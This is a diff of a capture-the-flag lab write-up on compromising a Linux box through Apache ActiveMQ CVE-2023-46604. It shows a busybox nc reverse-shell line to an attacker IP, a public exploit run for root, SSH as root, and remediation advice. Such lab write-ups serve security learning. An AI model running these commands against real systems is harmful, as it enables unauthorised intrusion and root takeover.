@@ -6,7 +6,7 @@
 
 - Difficulty: Easy
 - Platform: Linux
-- Skills Demonstrated: Web Exploitation, Default Credential Abuse, Exploitation of Known Vulnerabilites, Linux Privilege Escalation
+- Skills Demonstrated: Web Exploitation, Default Credential Abuse, Exploitation of Known Vulnerabilites, Linux Privilege Escalation, Sudo Misconfiguration Abuse
 
 ---
 ## Enumeration 
@@ -145,7 +145,7 @@ busybox nc 10.10.14.170 4444 -e /bin/bash
 
 ![shell](Images/shell.png)
 
-The user.txt flag can be found in the /home/activemq directory 
+The user.txt flag can be found in the `/home/activemq` directory 
 
 ## Privilege Escalation
 
@@ -164,3 +164,48 @@ The exploit enabled WebDAV and exposed the filesystem,, allowing arbitrary file 
 
 
 Exploit source: https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406
+
+The exploit was saved locally as `exploit.sh`, assigned execute permissions and then executed 
+```
+chmod +x exploit.sh
+```
+```
+./exploit.sh
+```
+![ssh](Images/ssh.png)
+- ensuring to leave the prompts for 'file save' and 'password' blank
+
+Once successfully executed, store the generated private key and assign it the appropriate permissions to enable SSH for root access
+
+![key](Images/key.png)
+
+```
+chmod 600 key
+```
+
+SSH as root 
+```
+ssh -i key root@10.129.230.87
+```
+
+![root](Images/root.png)
+
+
+## Conclusion
+
+The target was successfully compromised by exploiting known vulnerbilites in Apache ActiveMQ (CVE-2023-46604), which enabled remote code execution. Intial Access was achieved using weak default credentials and a public exploit, followed by privilege escalation through misconfigured sudo permissions. 
+
+## Lessons Learned
+
+This machine highlighted the importance of service enumeration and version identification and reinforces the concept of strong authentication mechanisms. 
+It also demonstrates how crucial sudo permissions can become when used as attack vectors to target misconfigured services.
+This lab was especially useful in understanding how simple enumeration and small misconfigurations can be chained together to achieve full system compromise.
+
+## Remediation
+
+To mitigate the vulnerabilites found in the system, the following actions should be taken:
+- Upgrade Apache ActiveMQ to a patched version not affected by CVE-2023-46604
+- Disable or restrict endpoints to untrusted networks
+- Enforce strong authentication and password policies
+- Restrict sudo permissions to prevent execution of privileged services
+- Disable unnecesary services and ports 
